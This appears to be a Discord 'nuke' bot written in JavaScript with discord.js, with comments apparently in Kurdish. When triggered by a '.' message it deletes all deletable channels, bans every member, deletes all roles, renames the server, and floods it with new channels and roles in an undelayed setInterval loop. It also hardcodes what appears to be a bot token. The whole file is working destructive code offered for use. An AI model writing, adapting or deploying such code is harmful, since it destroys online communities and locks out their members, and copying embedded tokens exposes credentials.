const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("DRAGONUP");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Wala gayran", "text");///////bo channel 
        message.guild.createChannel("Wala gayran", "voice");////bo voice
        message.guild.createRole({ name: "Gayra wakan " });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODgzNDQ5MzQ4MzQyNTY2OTEy.YTKGUg.4qErE9Ov4Cajr29VBC5EmyHtHS4")
